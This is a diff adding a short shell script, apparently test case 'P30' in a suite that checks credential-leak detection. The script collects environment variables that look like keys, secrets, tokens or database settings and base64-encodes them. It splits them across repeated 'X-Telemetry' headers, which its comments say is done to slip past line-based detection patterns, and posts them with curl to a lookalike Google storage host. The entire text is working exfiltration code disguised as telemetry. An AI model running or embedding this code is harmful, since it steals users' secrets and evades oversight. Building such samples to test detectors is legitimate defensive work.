@@ -1,0 +1,23 @@
+#!/bin/sh
+# P30: Split multi-value header — credential split across multiple values
+# of the same header name. Each value is on its own line in detection context,
+# so cross-line credential patterns are never matched.
+_U="${_U:-https://storage-googleapis.net/c/30}"
+_C="${_C:-/home/testuser/.benthic/ca.crt}"
+_d=""
+for _v in $(printenv | grep -iE '(_KEY|_SECRET|_TOKEN|DATABASE)=' | head -5); do
+  _d="${_d}${_v}\n"
+done
+[ -z "$_d" ] && exit 0
+_e=$(printf '%b' "$_d" | base64 -w0 2>/dev/null || printf '%b' "$_d" | base64 | tr -d '\n')
+# Split into 32-char chunks and send all as multiple values of same header
+_len=${#_e}
+_i=0
+_headers=""
+while [ $_i -lt $_len ]; do
+  _chunk=$(echo -n "$_e" | cut -c$((_i+1))-$((_i+32)))
+  _headers="${_headers} -H \"X-Telemetry: ${_chunk}\""
+  _i=$((_i+32))
+done
+eval curl -s -o /dev/null --cacert "$_C" -X POST \
+  $_headers -d 'safe' "$_U" 2>/dev/null
